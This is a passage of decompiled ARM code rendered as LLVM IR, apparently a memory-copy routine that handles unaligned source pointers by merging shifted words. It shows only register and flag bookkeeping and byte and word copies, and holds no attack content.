  %v2_fb3c = phi i32 [ %v10_fb1c, %.thread5 ], [ %v0_fbcc75, %.thread11 ], [ %v7_fb1c, %dec_label_pc_fb0c ], [ %v1_fa90, %bb ], [ %v2_fb3c113, %dec_label_pc_fc68 ], [ %v2_fb3c112, %dec_label_pc_fbfc ], [ %v2_fb3c111, %dec_label_pc_fcd4 ], [ %v12_fb24, %bb131 ]
  %v0_fb2c = phi i32 [ %v0_fb2c.pre, %.thread5 ], [ %v2_fb74, %.thread11 ], [ %v2_fb0c, %dec_label_pc_fb0c ], [ %v2_faa0, %bb ], [ %v0_fb2c109, %dec_label_pc_fc68 ], [ %v0_fb2c108, %dec_label_pc_fbfc ], [ %v0_fb2c107, %dec_label_pc_fcd4 ], [ %v7_fb28, %bb131 ]
  %v1_fb2c = add i32 %v0_fb2c, 4
  store i32 %v1_fb2c, i32* @r2, align 4
  %v3_fb2c = sub i32 0, %v0_fb2c
  %v4_fb2c = and i32 %v1_fb2c, %v3_fb2c
  %v5_fb2c = icmp slt i32 %v4_fb2c, 0
  store i1 %v5_fb2c, i1* %cpsr_v.global-to-local, align 1
  %v6_fb2c = icmp slt i32 %v1_fb2c, 0
  store i1 %v6_fb2c, i1* %cpsr_n.global-to-local, align 1
  %v7_fb2c = icmp eq i32 %v1_fb2c, 0
  store i1 %v7_fb2c, i1* @cpsr_z, align 1
  br i1 %v7_fb2c, label %bb133, label %bb134

bb133:                                            ; preds = %bb132
  %v3_fb30 = load i8*, i8** %stack_var_-8, align 4
  %v4_fb30 = ptrtoint i8* %v3_fb30 to i32
  store i32 %v4_fb30, i32* %r0.global-to-local, align 4
  ret i32 %v4_fb30

bb134:                                            ; preds = %bb132
  %v1_fb34 = add i32 %v0_fb2c, 2
  %v3_fb34 = sub i32 -3, %v0_fb2c
  %v4_fb34 = and i32 %v3_fb34, %v1_fb2c
  %v5_fb34 = icmp slt i32 %v4_fb34, 0
  store i1 %v5_fb34, i1* %cpsr_v.global-to-local, align 1
  %v6_fb34 = icmp slt i32 %v1_fb34, 0
  store i1 %v6_fb34, i1* %cpsr_n.global-to-local, align 1
  %v7_fb34 = icmp eq i32 %v1_fb2c, 2
  store i1 %v7_fb34, i1* @cpsr_z, align 1
  %v0_fb38 = load i32, i32* @r1, align 4
  %v1_fb38 = inttoptr i32 %v0_fb38 to i8*
  %v2_fb38 = load i8, i8* %v1_fb38, align 1
  %v3_fb38 = zext i8 %v2_fb38 to i32
  store i32 %v3_fb38, i32* @r3, align 4
  %v5_fb38 = add i32 %v0_fb38, 1
  store i32 %v5_fb38, i32* @r1, align 4
  %v3_fb3c = inttoptr i32 %v2_fb3c to i8*
  store i8 %v2_fb38, i8* %v3_fb3c, align 1
  %v4_fb3c = load i32, i32* %r0.global-to-local, align 4
  %v5_fb3c = add i32 %v4_fb3c, 1
  store i32 %v5_fb3c, i32* %r0.global-to-local, align 4
  %v0_fb40 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_fb40 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_fb40 = xor i1 %v0_fb40, %v1_fb40
  br i1 %v2_fb40, label %.thread119, label %bb135

bb135:                                            ; preds = %bb134
  %v3_fb40 = load i32, i32* @r1, align 4
  %v4_fb40 = inttoptr i32 %v3_fb40 to i8*
  %v5_fb40 = load i8, i8* %v4_fb40, align 1
  %v6_fb40 = zext i8 %v5_fb40 to i32
  store i32 %v6_fb40, i32* @r3, align 4
  %v8_fb40 = add i32 %v3_fb40, 1
  store i32 %v8_fb40, i32* @r1, align 4
  %v6_fb44 = inttoptr i32 %v5_fb3c to i8*
  store i8 %v5_fb40, i8* %v6_fb44, align 1
  %v7_fb44 = load i32, i32* %r0.global-to-local, align 4
  %v8_fb44 = add i32 %v7_fb44, 1
  store i32 %v8_fb44, i32* %r0.global-to-local, align 4
  %v1_fb48.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_fb48.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread119

.thread119:                                       ; preds = %bb134, %bb135
  %v7_fb4c = phi i32 [ %v8_fb44, %bb135 ], [ %v5_fb3c, %bb134 ]
  %v2_fb4c = phi i1 [ %v2_fb48.pre, %bb135 ], [ %v1_fb40, %bb134 ]
  %v1_fb4c = phi i1 [ %v1_fb48.pre, %bb135 ], [ %v0_fb40, %bb134 ]
  %v0_fb48 = load i1, i1* @cpsr_z, align 1
  %v3_fb48 = xor i1 %v2_fb4c, %v1_fb4c
  %v4_fb48 = or i1 %v0_fb48, %v3_fb48
  br i1 %v4_fb48, label %.thread120, label %bb136

bb136:                                            ; preds = %.thread119
  %v5_fb48 = load i32, i32* @r1, align 4
  %v6_fb48 = inttoptr i32 %v5_fb48 to i8*
  %v7_fb48 = load i8, i8* %v6_fb48, align 1
  %v8_fb48 = zext i8 %v7_fb48 to i32
  store i32 %v8_fb48, i32* @r3, align 4
  %v10_fb48 = add i32 %v5_fb48, 1
  store i32 %v10_fb48, i32* @r1, align 4
  %v8_fb4c = inttoptr i32 %v7_fb4c to i8*
  store i8 %v7_fb48, i8* %v8_fb4c, align 1
  %v9_fb4c = load i32, i32* %r0.global-to-local, align 4
  %v10_fb4c = add i32 %v9_fb4c, 1
  store i32 %v10_fb4c, i32* %r0.global-to-local, align 4
  br label %.thread120

.thread120:                                       ; preds = %.thread119, %bb136
  %v2_fb50 = load i8*, i8** %stack_var_-8, align 4
  %v3_fb50 = ptrtoint i8* %v2_fb50 to i32
  store i32 %v3_fb50, i32* %r0.global-to-local, align 4
  ret i32 %v3_fb50

dec_label_pc_fb54:                                ; preds = %dec_label_pc_faa8
  %v1_fb54 = sub nsw i32 4, %v1_faa8
  store i32 %v1_fb54, i32* @ip, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_fb58 = icmp ult i32 %v1_fb54, 2
  store i1 %v8_fb58, i1* %cpsr_n.global-to-local, align 1
  %v1_fb5c = inttoptr i32 %v0_fa90 to i8*
  %v2_fb5c = load i8, i8* %v1_fb5c, align 1
  %v3_fb5c = zext i8 %v2_fb5c to i32
  store i32 %v3_fb5c, i32* @r3, align 4
  %v5_fb5c = add i32 %v0_fa90, 1
  store i32 %v5_fb5c, i32* @r1, align 4
  store i8 %v2_fb5c, i8* %v5_fa9c, align 1
  %v4_fb60 = load i32, i32* %r0.global-to-local, align 4
  %v5_fb60 = add i32 %v4_fb60, 1
  store i32 %v5_fb60, i32* %r0.global-to-local, align 4
  br i1 %v8_fb58, label %.thread11, label %bb137

bb137:                                            ; preds = %dec_label_pc_fb54
  %v9_fb58 = icmp eq i32 %v1_fb54, 2
  %v6_fb64 = load i32, i32* @r1, align 4
  %v7_fb64 = inttoptr i32 %v6_fb64 to i8*
  %v8_fb64 = load i8, i8* %v7_fb64, align 1
  %v9_fb64 = zext i8 %v8_fb64 to i32
  store i32 %v9_fb64, i32* @r3, align 4
  %v11_fb64 = add i32 %v6_fb64, 1
  store i32 %v11_fb64, i32* @r1, align 4
  %v9_fb68 = inttoptr i32 %v5_fb60 to i8*
  store i8 %v8_fb64, i8* %v9_fb68, align 1
  %v10_fb68 = load i32, i32* %r0.global-to-local, align 4
  %v11_fb68 = add i32 %v10_fb68, 1
  store i32 %v11_fb68, i32* %r0.global-to-local, align 4
  br i1 %v9_fb58, label %.thread11, label %bb138

bb138:                                            ; preds = %bb137
  %v8_fb6c = load i32, i32* @r1, align 4
  %v9_fb6c = inttoptr i32 %v8_fb6c to i8*
  %v10_fb6c = load i8, i8* %v9_fb6c, align 1
  %v11_fb6c = zext i8 %v10_fb6c to i32
  store i32 %v11_fb6c, i32* @r3, align 4
  %v13_fb6c = add i32 %v8_fb6c, 1
  store i32 %v13_fb6c, i32* @r1, align 4
  %v11_fb70 = inttoptr i32 %v11_fb68 to i8*
  store i8 %v10_fb6c, i8* %v11_fb70, align 1
  %v12_fb70 = load i32, i32* %r0.global-to-local, align 4
  %v13_fb70 = add i32 %v12_fb70, 1
  store i32 %v13_fb70, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %bb137, %dec_label_pc_fb54, %bb138
  %v0_fbcc75 = phi i32 [ %v11_fb68, %bb137 ], [ %v5_fb60, %dec_label_pc_fb54 ], [ %v13_fb70, %bb138 ]
  %v0_fb74 = load i32, i32* %r2.global-to-local, align 4
  %v1_fb74 = load i32, i32* @ip, align 4
  %v2_fb74 = sub i32 %v0_fb74, %v1_fb74
  store i32 %v2_fb74, i32* %r2.global-to-local, align 4
  %v4_fb74 = xor i32 %v1_fb74, %v0_fb74
  %v5_fb74 = xor i32 %v2_fb74, %v0_fb74
  %v6_fb74 = and i32 %v5_fb74, %v4_fb74
  %v7_fb74 = icmp slt i32 %v6_fb74, 0
  store i1 %v7_fb74, i1* %cpsr_v.global-to-local, align 1
  %v8_fb74 = icmp slt i32 %v2_fb74, 0
  store i1 %v8_fb74, i1* %cpsr_n.global-to-local, align 1
  %v5_fb78 = icmp slt i32 %v0_fb74, %v1_fb74
  br i1 %v5_fb78, label %bb132, label %dec_label_pc_fb7c

dec_label_pc_fb7c:                                ; preds = %.thread11
  %v0_fb7c = load i32, i32* @r1, align 4
  %v1_fb7c = urem i32 %v0_fb7c, 4
  store i32 %v1_fb7c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_fb7c = icmp eq i32 %v1_fb7c, 0
  %extract.t123 = trunc i32 %v0_fb7c to i2
  br i1 %v2_fb7c, label %dec_label_pc_fab8, label %dec_label_pc_fb84

dec_label_pc_fb84:                                ; preds = %dec_label_pc_fab0, %dec_label_pc_fb7c
  %v0_fbcc74 = phi i32 [ %v1_fa90, %dec_label_pc_fab0 ], [ %v0_fbcc75, %dec_label_pc_fb7c ]
  %v0_fc78 = phi i32 [ %v2_faa0, %dec_label_pc_fab0 ], [ %v2_fb74, %dec_label_pc_fb7c ]
  %v0_fb8c.off0 = phi i2 [ %extract.t, %dec_label_pc_fab0 ], [ %extract.t123, %dec_label_pc_fb7c ]
  %v0_fb84 = phi i32 [ %v0_fa90, %dec_label_pc_fab0 ], [ %v0_fb7c, %dec_label_pc_fb7c ]
  %v1_fb84 = and i32 %v0_fb84, -4
  store i32 %v1_fb84, i32* %r1.global-to-local, align 4
  %v1_fb88 = inttoptr i32 %v1_fb84 to i32*
  %v2_fb88 = load i32, i32* %v1_fb88, align 4
  store i32 %v2_fb88, i32* @lr, align 4
  %v4_fb88 = add i32 %v1_fb84, 4
  store i32 %v4_fb88, i32* %r1.global-to-local, align 4
  %v2_fc70 = add i32 %v0_fc78, -12
  %v4_fc70 = sub i32 11, %v0_fc78
  %v5_fc70 = and i32 %v4_fc70, %v0_fc78
  %v6_fc70 = icmp slt i32 %v5_fc70, 0
  store i1 %v6_fc70, i1* %cpsr_v.global-to-local, align 1
  %v7_fc70 = icmp slt i32 %v2_fc70, 0
  store i1 %v7_fc70, i1* %cpsr_n.global-to-local, align 1
  %v5_fc74 = icmp slt i32 %v0_fc78, 12
  switch i2 %v0_fb8c.off0, label %dec_label_pc_fb98 [
    i2 -1, label %dec_label_pc_fc70
    i2 -2, label %dec_label_pc_fc04
  ]

dec_label_pc_fb98:                                ; preds = %dec_label_pc_fb84
  br i1 %v5_fc74, label %dec_label_pc_fbe4, label %dec_label_pc_fba0

dec_label_pc_fba0:                                ; preds = %dec_label_pc_fb98
  store i32 %v2_fc70, i32* %r2.global-to-local, align 4
  %v3_fba4 = load i32, i32* @r4, align 4
  store i32 %v3_fba4, i32* %stack_var_-16, align 4
  %v6_fba4 = load i32, i32* @r5, align 4
  store i32 %v6_fba4, i32* %stack_var_-12, align 4
  br label %dec_label_pc_fba8

dec_label_pc_fba8:                                ; preds = %dec_label_pc_fba8.dec_label_pc_fba8_crit_edge, %dec_label_pc_fba0
  %v0_fbcc = phi i32 [ %v12_fbcc, %dec_label_pc_fba8.dec_label_pc_fba8_crit_edge ], [ %v0_fbcc74, %dec_label_pc_fba0 ]
  %v0_fbac = phi i32 [ %v0_fbac.pre, %dec_label_pc_fba8.dec_label_pc_fba8_crit_edge ], [ %v4_fb88, %dec_label_pc_fba0 ]
  %v0_fba8 = phi i32 [ %v0_fba8.pre, %dec_label_pc_fba8.dec_label_pc_fba8_crit_edge ], [ %v2_fb88, %dec_label_pc_fba0 ]
  %v3_fba8 = udiv i32 %v0_fba8, 256
  %v1_fbac = inttoptr i32 %v0_fbac to i32*
  %v2_fbac = load i32, i32* %v1_fbac, align 4
  store i32 %v2_fbac, i32* %r4.global-to-local, align 4
  %v3_fbac = add i32 %v0_fbac, 4
  %v4_fbac = inttoptr i32 %v3_fbac to i32*
  %v5_fbac = load i32, i32* %v4_fbac, align 4
  store i32 %v5_fbac, i32* %r5.global-to-local, align 4
  %v6_fbac = add i32 %v0_fbac, 8
  %v7_fbac = inttoptr i32 %v6_fbac to i32*
  %v8_fbac = load i32, i32* %v7_fbac, align 4
  store i32 %v8_fbac, i32* %ip.global-to-local, align 4
  %v9_fbac = add i32 %v0_fbac, 12
  %v10_fbac = inttoptr i32 %v9_fbac to i32*
  %v11_fbac = load i32, i32* %v10_fbac, align 4
  store i32 %v11_fbac, i32* @lr, align 4
  %v12_fbac = add i32 %v0_fbac, 16
  store i32 %v12_fbac, i32* %r1.global-to-local, align 4
  %v4_fbb0 = mul i32 %v2_fbac, 16777216
  %v5_fbb0 = or i32 %v4_fbb0, %v3_fba8
  store i32 %v5_fbb0, i32* @r3, align 4
  %v3_fbb4 = udiv i32 %v2_fbac, 256
  %v4_fbb8 = mul i32 %v5_fbac, 16777216
  %v5_fbb8 = or i32 %v4_fbb8, %v3_fbb4
  store i32 %v5_fbb8, i32* %r4.global-to-local, align 4
  %v3_fbbc = udiv i32 %v5_fbac, 256
  %v4_fbc0 = mul i32 %v8_fbac, 16777216
  %v5_fbc0 = or i32 %v4_fbc0, %v3_fbbc
  store i32 %v5_fbc0, i32* %r5.global-to-local, align 4
  %v3_fbc4 = udiv i32 %v8_fbac, 256
  %v4_fbc8 = mul i32 %v11_fbac, 16777216
  %v5_fbc8 = or i32 %v4_fbc8, %v3_fbc4
  store i32 %v5_fbc8, i32* @ip, align 4
  %v1_fbcc = inttoptr i32 %v0_fbcc to i32*
  store i32 %v5_fbb0, i32* %v1_fbcc, align 4
  %v3_fbcc = add i32 %v0_fbcc, 4
  %v4_fbcc = inttoptr i32 %v3_fbcc to i32*
  %v5_fbcc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_fbcc, i32* %v4_fbcc, align 4
  %v6_fbcc = add i32 %v0_fbcc, 8
  %v7_fbcc = inttoptr i32 %v6_fbcc to i32*
  %v8_fbcc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_fbcc, i32* %v7_fbcc, align 4
  %v9_fbcc = add i32 %v0_fbcc, 12
  %v10_fbcc = inttoptr i32 %v9_fbcc to i32*
  %v11_fbcc = load i32, i32* @ip, align 4
  store i32 %v11_fbcc, i32* %v10_fbcc, align 4
  %v12_fbcc = add i32 %v0_fbcc, 16
  store i32 %v12_fbcc, i32* %r0.global-to-local, align 4
  %v0_fbd0 = load i32, i32* %r2.global-to-local, align 4
  %v2_fbd0 = add i32 %v0_fbd0, -16
  store i32 %v2_fbd0, i32* %r2.global-to-local, align 4
  %v6_fbd4 = icmp slt i32 %v0_fbd0, 16
  br i1 %v6_fbd4, label %dec_label_pc_fbd8, label %dec_label_pc_fba8.dec_label_pc_fba8_crit_edge

dec_label_pc_fba8.dec_label_pc_fba8_crit_edge:    ; preds = %dec_label_pc_fba8
  %v0_fba8.pre = load i32, i32* @lr, align 4
  %v0_fbac.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_fba8

dec_label_pc_fbd8:                                ; preds = %dec_label_pc_fba8
  %v2_fbd8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_fbd8, i32* @r4, align 4
  %v5_fbd8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_fbd8, i32* @r5, align 4
  %v2_fbdc = add i32 %v0_fbd0, -4
  store i32 %v2_fbdc, i32* %r2.global-to-local, align 4
  %v4_fbdc = add i32 %v0_fbd0, 2147483632
  %v5_fbdc = and i32 %v2_fbdc, %v4_fbdc
  %v6_fbdc = icmp slt i32 %v5_fbdc, 0
  store i1 %v6_fbdc, i1* %cpsr_v.global-to-local, align 1
  %v7_fbdc = icmp slt i32 %v2_fbdc, 0
  store i1 %v7_fbdc, i1* %cpsr_n.global-to-local, align 1
  %v5_fbe0 = icmp slt i32 %v2_fbd0, -12
  br i1 %v5_fbe0, label %dec_label_pc_fbfc, label %dec_label_pc_fbe4

dec_label_pc_fbe4:                                ; preds = %dec_label_pc_fbd8, %dec_label_pc_fb98, %dec_label_pc_fbe4
  %v1_fbf0 = phi i32 [ %v4_fbf0, %dec_label_pc_fbe4 ], [ %v12_fbcc, %dec_label_pc_fbd8 ], [ %v0_fbcc74, %dec_label_pc_fb98 ]
  %v0_fbe4 = load i32, i32* @lr, align 4
  %v3_fbe4 = udiv i32 %v0_fbe4, 256
  store i32 %v3_fbe4, i32* %ip.global-to-local, align 4
  %v0_fbe8 = load i32, i32* %r1.global-to-local, align 4
  %v1_fbe8 = inttoptr i32 %v0_fbe8 to i32*
  %v2_fbe8 = load i32, i32* %v1_fbe8, align 4
  store i32 %v2_fbe8, i32* @lr, align 4
  %v4_fbe8 = add i32 %v0_fbe8, 4
  store i32 %v4_fbe8, i32* %r1.global-to-local, align 4
  %v4_fbec = mul i32 %v2_fbe8, 16777216
  %v5_fbec = or i32 %v4_fbec, %v3_fbe4
  store i32 %v5_fbec, i32* @ip, align 4
  %v2_fbf0 = inttoptr i32 %v1_fbf0 to i32*
  store i32 %v5_fbec, i32* %v2_fbf0, align 4
  %v3_fbf0 = load i32, i32* %r0.global-to-local, align 4
  %v4_fbf0 = add i32 %v3_fbf0, 4
  store i32 %v4_fbf0, i32* %r0.global-to-local, align 4
  %v0_fbf4 = load i32, i32* %r2.global-to-local, align 4
  %v2_fbf4 = add i32 %v0_fbf4, -4
  store i32 %v2_fbf4, i32* %r2.global-to-local, align 4
  %v6_fbf8 = icmp slt i32 %v0_fbf4, 4
  br i1 %v6_fbf8, label %dec_label_pc_fbfc.loopexit, label %dec_label_pc_fbe4

dec_label_pc_fbfc.loopexit:                       ; preds = %dec_label_pc_fbe4
  %v4_fbf4 = sub i32 3, %v0_fbf4
  %v5_fbf4 = and i32 %v4_fbf4, %v0_fbf4
  %v6_fbf4 = icmp slt i32 %v5_fbf4, 0
  %v7_fbf4 = icmp slt i32 %v2_fbf4, 0
  store i1 %v6_fbf4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_fbf4, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_fbfc

dec_label_pc_fbfc:                                ; preds = %dec_label_pc_fbfc.loopexit, %dec_label_pc_fbd8
  %v2_fb3c112 = phi i32 [ %v4_fbf0, %dec_label_pc_fbfc.loopexit ], [ %v12_fbcc, %dec_label_pc_fbd8 ]
  %v0_fb2c108 = phi i32 [ %v2_fbf4, %dec_label_pc_fbfc.loopexit ], [ %v2_fbdc, %dec_label_pc_fbd8 ]
  %v0_fbfc = load i32, i32* %r1.global-to-local, align 4
  %v1_fbfc = add i32 %v0_fbfc, -3
  store i32 %v1_fbfc, i32* @r1, align 4
  br label %bb132

dec_label_pc_fc04:                                ; preds = %dec_label_pc_fb84
  br i1 %v5_fc74, label %dec_label_pc_fc50, label %dec_label_pc_fc0c

dec_label_pc_fc0c:                                ; preds = %dec_label_pc_fc04
  store i32 %v2_fc70, i32* %r2.global-to-local, align 4
  %v3_fc10 = load i32, i32* @r4, align 4
  store i32 %v3_fc10, i32* %stack_var_-16, align 4
  %v6_fc10 = load i32, i32* @r5, align 4
  store i32 %v6_fc10, i32* %stack_var_-12, align 4
  br label %dec_label_pc_fc14

dec_label_pc_fc14:                                ; preds = %dec_label_pc_fc14.dec_label_pc_fc14_crit_edge, %dec_label_pc_fc0c
  %v0_fc38 = phi i32 [ %v12_fc38, %dec_label_pc_fc14.dec_label_pc_fc14_crit_edge ], [ %v0_fbcc74, %dec_label_pc_fc0c ]
  %v0_fc18 = phi i32 [ %v0_fc18.pre, %dec_label_pc_fc14.dec_label_pc_fc14_crit_edge ], [ %v4_fb88, %dec_label_pc_fc0c ]
  %v0_fc14 = phi i32 [ %v0_fc14.pre, %dec_label_pc_fc14.dec_label_pc_fc14_crit_edge ], [ %v2_fb88, %dec_label_pc_fc0c ]
  %v3_fc14 = udiv i32 %v0_fc14, 65536
  %v1_fc18 = inttoptr i32 %v0_fc18 to i32*
  %v2_fc18 = load i32, i32* %v1_fc18, align 4
  store i32 %v2_fc18, i32* %r4.global-to-local, align 4
  %v3_fc18 = add i32 %v0_fc18, 4
  %v4_fc18 = inttoptr i32 %v3_fc18 to i32*
  %v5_fc18 = load i32, i32* %v4_fc18, align 4
  store i32 %v5_fc18, i32* %r5.global-to-local, align 4
  %v6_fc18 = add i32 %v0_fc18, 8
  %v7_fc18 = inttoptr i32 %v6_fc18 to i32*
  %v8_fc18 = load i32, i32* %v7_fc18, align 4
  store i32 %v8_fc18, i32* %ip.global-to-local, align 4
  %v9_fc18 = add i32 %v0_fc18, 12
  %v10_fc18 = inttoptr i32 %v9_fc18 to i32*
  %v11_fc18 = load i32, i32* %v10_fc18, align 4
  store i32 %v11_fc18, i32* @lr, align 4
  %v12_fc18 = add i32 %v0_fc18, 16
  store i32 %v12_fc18, i32* %r1.global-to-local, align 4
  %v4_fc1c = mul i32 %v2_fc18, 65536
  %v5_fc1c = or i32 %v4_fc1c, %v3_fc14
  store i32 %v5_fc1c, i32* @r3, align 4
  %v3_fc20 = udiv i32 %v2_fc18, 65536
  %v4_fc24 = mul i32 %v5_fc18, 65536
  %v5_fc24 = or i32 %v4_fc24, %v3_fc20
  store i32 %v5_fc24, i32* %r4.global-to-local, align 4
  %v3_fc28 = udiv i32 %v5_fc18, 65536
  %v4_fc2c = mul i32 %v8_fc18, 65536
  %v5_fc2c = or i32 %v4_fc2c, %v3_fc28
  store i32 %v5_fc2c, i32* %r5.global-to-local, align 4
  %v3_fc30 = udiv i32 %v8_fc18, 65536
  %v4_fc34 = mul i32 %v11_fc18, 65536
  %v5_fc34 = or i32 %v4_fc34, %v3_fc30
  store i32 %v5_fc34, i32* @ip, align 4
  %v1_fc38 = inttoptr i32 %v0_fc38 to i32*
  store i32 %v5_fc1c, i32* %v1_fc38, align 4
  %v3_fc38 = add i32 %v0_fc38, 4
  %v4_fc38 = inttoptr i32 %v3_fc38 to i32*
  %v5_fc38 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_fc38, i32* %v4_fc38, align 4
  %v6_fc38 = add i32 %v0_fc38, 8
  %v7_fc38 = inttoptr i32 %v6_fc38 to i32*
  %v8_fc38 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_fc38, i32* %v7_fc38, align 4
  %v9_fc38 = add i32 %v0_fc38, 12
  %v10_fc38 = inttoptr i32 %v9_fc38 to i32*
  %v11_fc38 = load i32, i32* @ip, align 4
  store i32 %v11_fc38, i32* %v10_fc38, align 4
  %v12_fc38 = add i32 %v0_fc38, 16
  store i32 %v12_fc38, i32* %r0.global-to-local, align 4
  %v0_fc3c = load i32, i32* %r2.global-to-local, align 4
  %v2_fc3c = add i32 %v0_fc3c, -16
  store i32 %v2_fc3c, i32* %r2.global-to-local, align 4
  %v6_fc40 = icmp slt i32 %v0_fc3c, 16
  br i1 %v6_fc40, label %dec_label_pc_fc44, label %dec_label_pc_fc14.dec_label_pc_fc14_crit_edge

dec_label_pc_fc14.dec_label_pc_fc14_crit_edge:    ; preds = %dec_label_pc_fc14
  %v0_fc14.pre = load i32, i32* @lr, align 4
  %v0_fc18.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_fc14

dec_label_pc_fc44:                                ; preds = %dec_label_pc_fc14
  %v2_fc44 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_fc44, i32* @r4, align 4
  %v5_fc44 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_fc44, i32* @r5, align 4
  %v2_fc48 = add i32 %v0_fc3c, -4
  store i32 %v2_fc48, i32* %r2.global-to-local, align 4
  %v4_fc48 = add i32 %v0_fc3c, 2147483632
  %v5_fc48 = and i32 %v2_fc48, %v4_fc48
  %v6_fc48 = icmp slt i32 %v5_fc48, 0
  store i1 %v6_fc48, i1* %cpsr_v.global-to-local, align 1
  %v7_fc48 = icmp slt i32 %v2_fc48, 0
  store i1 %v7_fc48, i1* %cpsr_n.global-to-local, align 1
  %v5_fc4c = icmp slt i32 %v2_fc3c, -12
  br i1 %v5_fc4c, label %dec_label_pc_fc68, label %dec_label_pc_fc50

dec_label_pc_fc50:                                ; preds = %dec_label_pc_fc44, %dec_label_pc_fc04, %dec_label_pc_fc50
  %v1_fc5c = phi i32 [ %v4_fc5c, %dec_label_pc_fc50 ], [ %v12_fc38, %dec_label_pc_fc44 ], [ %v0_fbcc74, %dec_label_pc_fc04 ]
  %v0_fc50 = load i32, i32* @lr, align 4
  %v3_fc50 = udiv i32 %v0_fc50, 65536
  store i32 %v3_fc50, i32* %ip.global-to-local, align 4
  %v0_fc54 = load i32, i32* %r1.global-to-local, align 4
  %v1_fc54 = inttoptr i32 %v0_fc54 to i32*
  %v2_fc54 = load i32, i32* %v1_fc54, align 4
  store i32 %v2_fc54, i32* @lr, align 4
  %v4_fc54 = add i32 %v0_fc54, 4
  store i32 %v4_fc54, i32* %r1.global-to-local, align 4
  %v4_fc58 = mul i32 %v2_fc54, 65536
  %v5_fc58 = or i32 %v4_fc58, %v3_fc50
  store i32 %v5_fc58, i32* @ip, align 4
  %v2_fc5c = inttoptr i32 %v1_fc5c to i32*
  store i32 %v5_fc58, i32* %v2_fc5c, align 4
  %v3_fc5c = load i32, i32* %r0.global-to-local, align 4
  %v4_fc5c = add i32 %v3_fc5c, 4
  store i32 %v4_fc5c, i32* %r0.global-to-local, align 4
  %v0_fc60 = load i32, i32* %r2.global-to-local, align 4
  %v2_fc60 = add i32 %v0_fc60, -4
  store i32 %v2_fc60, i32* %r2.global-to-local, align 4
  %v6_fc64 = icmp slt i32 %v0_fc60, 4
  br i1 %v6_fc64, label %dec_label_pc_fc68.loopexit, label %dec_label_pc_fc50

dec_label_pc_fc68.loopexit:                       ; preds = %dec_label_pc_fc50
  %v4_fc60 = sub i32 3, %v0_fc60
  %v5_fc60 = and i32 %v4_fc60, %v0_fc60
  %v6_fc60 = icmp slt i32 %v5_fc60, 0
  %v7_fc60 = icmp slt i32 %v2_fc60, 0
  store i1 %v6_fc60, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_fc60, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_fc68

dec_label_pc_fc68:                                ; preds = %dec_label_pc_fc68.loopexit, %dec_label_pc_fc44
  %v2_fb3c113 = phi i32 [ %v4_fc5c, %dec_label_pc_fc68.loopexit ], [ %v12_fc38, %dec_label_pc_fc44 ]
  %v0_fb2c109 = phi i32 [ %v2_fc60, %dec_label_pc_fc68.loopexit ], [ %v2_fc48, %dec_label_pc_fc44 ]
  %v0_fc68 = load i32, i32* %r1.global-to-local, align 4
  %v1_fc68 = add i32 %v0_fc68, -2
  store i32 %v1_fc68, i32* @r1, align 4
  br label %bb132

dec_label_pc_fc70:                                ; preds = %dec_label_pc_fb84
  br i1 %v5_fc74, label %dec_label_pc_fcbc, label %dec_label_pc_fc78

dec_label_pc_fc78:                                ; preds = %dec_label_pc_fc70
  store i32 %v2_fc70, i32* %r2.global-to-local, align 4
  %v3_fc7c = load i32, i32* @r4, align 4
  store i32 %v3_fc7c, i32* %stack_var_-16, align 4
  %v6_fc7c = load i32, i32* @r5, align 4
  store i32 %v6_fc7c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_fc80

dec_label_pc_fc80:                                ; preds = %dec_label_pc_fc80.dec_label_pc_fc80_crit_edge, %dec_label_pc_fc78
  %v0_fca4 = phi i32 [ %v12_fca4, %dec_label_pc_fc80.dec_label_pc_fc80_crit_edge ], [ %v0_fbcc74, %dec_label_pc_fc78 ]
  %v0_fc84 = phi i32 [ %v0_fc84.pre, %dec_label_pc_fc80.dec_label_pc_fc80_crit_edge ], [ %v4_fb88, %dec_label_pc_fc78 ]
  %v0_fc80 = phi i32 [ %v0_fc80.pre, %dec_label_pc_fc80.dec_label_pc_fc80_crit_edge ], [ %v2_fb88, %dec_label_pc_fc78 ]
  %v3_fc80 = udiv i32 %v0_fc80, 16777216
  %v1_fc84 = inttoptr i32 %v0_fc84 to i32*
  %v2_fc84 = load i32, i32* %v1_fc84, align 4
  store i32 %v2_fc84, i32* %r4.global-to-local, align 4
  %v3_fc84 = add i32 %v0_fc84, 4
  %v4_fc84 = inttoptr i32 %v3_fc84 to i32*
  %v5_fc84 = load i32, i32* %v4_fc84, align 4
  store i32 %v5_fc84, i32* %r5.global-to-local, align 4
  %v6_fc84 = add i32 %v0_fc84, 8
  %v7_fc84 = inttoptr i32 %v6_fc84 to i32*
  %v8_fc84 = load i32, i32* %v7_fc84, align 4
  store i32 %v8_fc84, i32* %ip.global-to-local, align 4
  %v9_fc84 = add i32 %v0_fc84, 12
  %v10_fc84 = inttoptr i32 %v9_fc84 to i32*
  %v11_fc84 = load i32, i32* %v10_fc84, align 4
  store i32 %v11_fc84, i32* @lr, align 4
  %v12_fc84 = add i32 %v0_fc84, 16
  store i32 %v12_fc84, i32* %r1.global-to-local, align 4
  %v4_fc88 = mul i32 %v2_fc84, 256
  %v5_fc88 = or i32 %v4_fc88, %v3_fc80
  store i32 %v5_fc88, i32* @r3, align 4
  %v3_fc8c = udiv i32 %v2_fc84, 16777216
